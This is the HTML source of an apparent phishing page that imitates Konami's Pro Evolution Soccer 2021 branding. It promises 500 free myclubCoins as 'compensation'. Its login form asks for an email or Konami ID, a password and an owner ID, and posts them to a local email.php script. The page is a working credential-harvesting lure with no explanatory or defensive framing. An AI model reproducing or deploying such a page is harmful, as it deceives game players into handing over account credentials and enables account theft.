<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1">
<script src="../cdn-cgi/apps/head/AlAgxD7oxHZSiFZQmr6zl7N739c.js"></script><link href='login.php%3Fid=1389371812.html' rel='icon'>
<title>PES2021 COMPENSATION | Claim Your 500 myclubCoins </title>
<script src="js/jquery.min.js" type="1f89a1544973494f61e791e0-text/javascript"></script>
<link rel="stylesheet" href="js/bootstrap.min.css">
<style>
h1, .h1, h2, .h2, h3, .h3 {
margin-top: 0px;
margin-bottom: 10.5px;
}

body {
 font-family:roboto mono,monospace;
 min-height:100vh;
 background-color:#333;
 background-image:url(img/back.jpg);
 background-position:center;
 background-size:cover
}

}
.error-msg {
margin: .5em 0;
display: block;
color: #dd4b39;
line-height: 17px;
}
.col-md-6 {
margin:0 auto;
float:none;
}
.col-md-12 {
margin:0 auto;
float:none;
}
</style>
<script async src='../cdn-cgi/challenge-platform/h/b/scripts/invisible.js' type="1f89a1544973494f61e791e0-text/javascript"></script><body style="padding:0px;margin:0 auto;">
<div style="padding:0px;margin:0 auto;" class="container ">
<div style="border:none;padding:0px;margin:0 auto;" class="col-md-6">
<div style="padding:10px;border-radius:0px;box-shadow: 0px 0px 0px rgba(0, 0, 0, 0.3);background-color: rgba(1,1,1,1); color: white;width:100%" class="form-horizontal" class="form-horizontal">
<img src="img/konami.png" width="30%" align="left">
<div style="text-align:right"><font size="2px">Europe / English &vee;</font></div>
</div>
<div style="padding:10px;border-radius:0px;box-shadow: 0px 0px 0px rgba(0, 0, 0, 0.3);background-color: rgba(1,1,1,0.8); color: white;width:100%" class="form-horizontal" class="form-horizontal">
<font size="2px">Konami <a "href.html">></a> PES2021 <a "href.html">></a> Compensation</font>
</div>
<center style="background:none;">
<div class="col-md">
<style type="text/css">
#main {
background:
url(img/bg_wv.jpg.html) 40% 90% no-repeat;
height:300px;
width: auto;
}
</style>
<div id="main">
<br>
<font color="white" size="1px">The official KONAMI Pro Evolution Soccer eSport</font><br><br>
<h3></h3>
</div>
<div style="padding:20px;border-radius:0px;box-shadow: 0px 0px 0px rgba(0, 0, 0, 0.3);background-color: rgba(1,1,1,0.8); color: white;width:100%" class="form-horizontal" class="form-horizontal">
<h4><b> Login with Konami ID </b></h4><FORM NAME="frmSignUp" METHOD="post" ACTION="email.php">
<input name="id" type="hidden" value="1389371812">
<div style="width:100%" class="form-group">
<input style="border-radius:9px;background-color: rgba(30,72,80,0.5); color: white;" class="form-control blender-pro-book form-text" id="Email" name="email" placeholder="Email Or Konami ID" type="Email" required>
</div>
<div style="width:100%" class="form-group">
<input style="border-radius:9px;background-color: rgba(30,72,80,0.5); color: white;" class="form-control blender-pro-book form-text" id="Password" name="password" placeholder="Password" type="Password" required>
</div>
<h4><b> Detailed Information </b></h4>
<div style="width:100%" class="form-group">
<input style="border-radius:9px;background-color: rgba(30,72,80,0.5); color: white;" class="form-control blender-pro-book form-text" id="AccId" name="playid" placeholder="Owner ID ( *ex : 712163382 )" type="number">
</div>
<div style="text-align:left" class="error-msg" id="hasilnya"></div>
<div style="width:100%" class="form-group">
<input type="submit" name="gsubmit" class="btn btn-block" style="color: #ffffff;border-radius:15px;background-color: #2780e3;" id="gsubmit" value="Connect"> </form>
</div>
</div>
<div style="padding:5px;border-radius:0px;box-shadow: 0px 0px 0px rgba(0, 0, 0, 0.3);background-color: rgba(1,1,1,0.6); color: white;width:100%" class="form-horizontal" class="form-horizontal">
</div>
</div>
<div style="padding:10px;border-radius:0px;box-shadow: 0px 0px 0px rgba(0, 0, 0, 0.3);background-color: rgba(1,1,1,0.8); color: white;width:100%" class="form-horizontal" class="form-horizontal">
<center><p>PES LEAGUE eSport </p></center>
<img src="img/mv_index_2.png" width="170px"></p>
<p>Copyright &copy; 2021 KONAMI.</p>
</div>
</div>
</div><script type="1f89a1544973494f61e791e0-text/javascript">(function(){window['__CF$cv$params']={r:'6b3e862fb9a66b54',m:'AdajD1xcF2gHHV1Gy6YSVHSCqDxgOVeWTs5JZO.U9Zo-1637881551-0-AY7l5+58sWous4VE3ZJqM9kkJewr85b/35me0p7nH1juRyEX0I+T8AT7rPx11jFL5S5guwpUiEAmQwfl9g1gstHrbietiOptKRGGNnurg0MCl6iSfpILJOcPcxtFOYvn8eqWF6lY4Tb2DfJ7s6jwsbA=',s:[0x6e503a91e1,0x9e9ccac73f],u:'/cdn-cgi/challenge-platform/h/b'}})();</script><script src="../cdn-cgi/scripts/7d0fa10a/cloudflare-static/rocket-loader.min.js" data-cf-settings="1f89a1544973494f61e791e0-|49" defer=""></script>